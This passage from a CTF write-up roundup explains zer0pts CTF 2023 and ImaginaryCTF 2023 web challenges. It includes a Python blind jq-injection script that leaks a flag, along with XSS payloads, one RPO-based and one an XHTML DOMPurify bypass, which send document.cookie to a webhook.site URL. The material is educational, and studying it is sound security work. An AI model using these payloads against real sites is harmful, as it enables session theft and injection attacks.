keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// build query for filtering results</span>    <span class="token keyword">let</span> condsQuery <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> cond <span class="token keyword">of</span> conds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>str<span class="token punctuation">,</span> key<span class="token punctuation">]</span> <span class="token operator">=</span> cond<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' in '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// check if the query is trying to break string literal</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'\\('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'hacking attempt detected'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        condsQuery <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">| select(.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | contains("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"))</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[.challenges[] </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>condsQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> | &#123;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>keysQuery<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] keys:'</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'[+] conds:'</span><span class="token punctuation">,</span> conds<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>    <span class="token keyword">let</span> result<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token keyword">await</span> jq<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> <span class="token string">'./data.json'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">output</span><span class="token operator">:</span> <span class="token string">'json'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'something wrong'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'sorry, you cannot use filters in demo version'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Although double quotation marks are blocked, the backslash <code>\</code> is not blocked. Therefore, by combining two conditions, you can insert your own jq command and achieve command injection. You can retrieve the flag using <code>env.FLAG</code>.</p><p>However, the problem is that the result is not returned, so it is a blind injection. You need to leak one character at a time. Below is the exploit from the <a href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> httpx<span class="token keyword">import</span> string# <span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://localhost:8300"</span><span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"http://jqi.2023.zer0pts.com:8300"</span><span class="token constant">CHARS</span> <span class="token operator">=</span> <span class="token string">"&#125;_"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsdef <span class="token function">make_str</span><span class="token punctuation">(</span>xs<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token operator">:</span>    <span class="token keyword">return</span> <span class="token string">"("</span> <span class="token operator">+</span> <span class="token string">"+"</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token string">"([&#123;ord(x)&#125;] | implode)"</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> xs<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>def <span class="token function">is_ok</span><span class="token punctuation">(</span>prefix<span class="token operator">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token operator">:</span>    res <span class="token operator">=</span> httpx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>        f<span class="token string">"&#123;BASE_URL&#125;/api/search"</span><span class="token punctuation">,</span>        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">"keys"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>            <span class="token string-property property">"conds"</span><span class="token operator">:</span> <span class="token string">","</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">[</span>                <span class="token string">"\\ in name"</span><span class="token punctuation">,</span>                f<span class="token string">"))] + [if (env.FLAG | startswith(&#123;make_str(prefix)&#125;)) then error(&#123;make_str('x')&#125;) else 0 end] # in name"</span>            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"something wrong"</span>known <span class="token operator">=</span> <span class="token string">"zer0pts&#123;"</span><span class="token keyword">while</span> not known<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token constant">CHARS</span><span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token function">is_ok</span><span class="token punctuation">(</span>known <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token operator">:</span>            known <span class="token operator">+=</span> c            <span class="token keyword">break</span>    <span class="token function">print</span><span class="token punctuation">(</span>known<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span> <span class="token operator">+</span> known<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="neko-note-26-solves">Neko Note (26 solves)</span></h3><p>This is another classic note app. The core code is as follows:</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> linkPattern <span class="token operator">=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`\[([0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-4[0-9a-f]&#123;3&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;)\]`</span><span class="token punctuation">)</span><span class="token comment">// replace [(note ID)] to links</span><span class="token keyword">func</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> linkPattern<span class="token punctuation">.</span><span class="token function">ReplaceAllStringFunc</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    id <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"[]"</span><span class="token punctuation">)</span>    note<span class="token punctuation">,</span> ok <span class="token operator">:=</span> notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> s    <span class="token punctuation">&#125;</span>    title <span class="token operator">:=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>Title<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span>      <span class="token string">"&lt;a href=/note/%s title=%s>%s&lt;/a>"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> title<span class="token punctuation">,</span>    <span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// escape note to prevent XSS first, then replace newlines to &lt;br> and render links</span><span class="token keyword">func</span> <span class="token function">renderNote</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  note <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>  note <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span>  note <span class="token operator">=</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>  <span class="token keyword">return</span> note<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After sanitization, the link will be replaced. Although there is also escaping here, because the attribute is not enclosed in quotes, arbitrary attributes can be injected into the <code>a</code> tag.</p><p>Here, triggering XSS seems possible with <code>onanimationend</code> or <code>onfocus</code>.</p><p>After triggering XSS, there is another step, which is that the stolen information is deleted. However, you can use the magical <code>document.execCommand(&#39;undo&#39;);</code> to restore it.</p><h3><span id="scoreshare-16-solves">ScoreShare (16 solves)</span></h3><p>The core code for this challenge is as follows:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        abc <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        link <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> title<span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'Title is empty'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> abc<span class="token punctuation">:</span>            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'ABC notation is empty'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            sid <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> title<span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> abc<span class="token punctuation">)</span>            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">,</span> link<span class="token punctuation">)</span>            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'score'</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/score/&lt;sid>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Score viewer"""</span>    title <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">)</span>    link <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> link <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">"Score not found"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">,</span> link<span class="token operator">=</span>link<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/score/&lt;sid>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    abc <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> abc <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can add a post or something similar, and there is an unintended endpoint <code>/api/score/&lt;sid&gt;</code> that directly outputs the entire <code>abc</code>. So, by adding two posts, one with JS content and the other with <code>&lt;script src=...&gt;</code>, you can directly perform XSS.</p><p>The expected solution can be found in the author’s article: <a href="https://ptr-yudai.hatenablog.com/#ScoreShare">zer0pts CTF 2023 Writeup</a>. By using iframe DOM clobbering and combining it with the existing functionality, prototype pollution can be achieved, and then the gadget for ABCJS can be found.</p><h3><span id="ringtone-14-solves">Ringtone (14 solves)</span></h3><p>This challenge is a bit complicated, so I’ll briefly summarize it. You can obtain an XSS in the Chrome extension context through DOM clobbering. Then, using <code>chrome.history.search</code>, you can retrieve the flag URL and obtain the flag.</p><p>Author’s writeup: <a href="https://ahmed-belkahla.me/post/zer0ptsctf2023/">Ringtone Web Challenge Writeup - Zer0pts CTF 2023</a></p><h3><span id="plain-blog-14-solves">Plain Blog (14 solves)</span></h3><p>This challenge is a blog app. You need permission to retrieve the flag, and to have this permission, your post must have more than 1_000_000_000_000 likes. However, it is clear that the website blocks the maximum number of likes, so it is impossible to reach such a high number.</p><p>The solution lies in a frontend prototype pollution vulnerability. By exploiting this vulnerability, you can contaminate the parameters of the fetch request and include the <code>X-HTTP-Method-Override: PUT</code> header, allowing the admin bot to directly call another API and obtain the permission.</p><h2><span id="imaginaryctf-2023">ImaginaryCTF 2023</span></h2><h3><span id="sanitized-5-solves">Sanitized (5 solves)</span></h3><p>The code for this challenge is quite short, and one thing worth noting is that the CSP is set to <code>default-src &#39;self&#39;</code>. Additionally, there is a path in Express:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Page </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> not found</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>It can be seen that the response from this path needs to be used as a script to execute.</p><p>On the frontend side, it is a classic call to DOMPurify:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token keyword">const</span> html <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> html  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When loading <code>main.js</code> in <code>index.xhtml</code>, it uses a relative path: <code>&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</code>.</p><p>Let’s first look at the unintended solution, which is quite interesting.</p><p>The unintended solution is to make the bot load this path: <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</code></p><p>This exploits RPO (Relative Path Overwrite) to cause mischief. For the backend, <code>%2f</code> is interpreted as <code>/</code>, so this URL loads <code>index.xhtml</code> without any issues.</p><p>However, for the browser, the current path becomes <code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//</code>, so it will load <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js</code>. According to Express’s route, the response will be:</p><pre class="line-numbers language-none"><code class="language-none">Page &#x2F;1;var[Page]&#x3D;[1];location&#x3D;location.hash.slice(1)+document.cookie&#x2F;&#x2F;main.js not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The first line <code>Page /1</code> does not throw a “variable is not defined” error because of the hoisting of <code>var [Page]=[1]</code>, and the last line <code>main.js not found</code> is turned into a comment by the preceding <code>//</code>, so the middle part is executed, and the cookie is stolen.</p><p>This operation is really cool.</p><h3><span id="sanitized-revenge-3-solves">Sanitized Revenge (3 solves)</span></h3><p>This question fixes the unintended behavior, so let’s take a look at the expected solution.</p><p>First and foremost, the important point of this question is that the webpage is xhtml, not html, so the browser’s parsing behavior will be different.</p><p>For example, the payload provided by the author:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>&lt;![CDATA[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">data-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>]]＞&lt;/style>&lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">--></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>will be parsed by the HTML parser as a style tag + a div with the <code>data-x</code> attribute, so DOMPurify won’t do anything, and this is valid HTML.</p><p>But because we are in xhtml, the CDATA part becomes something that looks like a comment, so after removing it, it becomes:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Page<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/+location.assign(document.all.url.textContent+document.cookie)//<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/div>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span 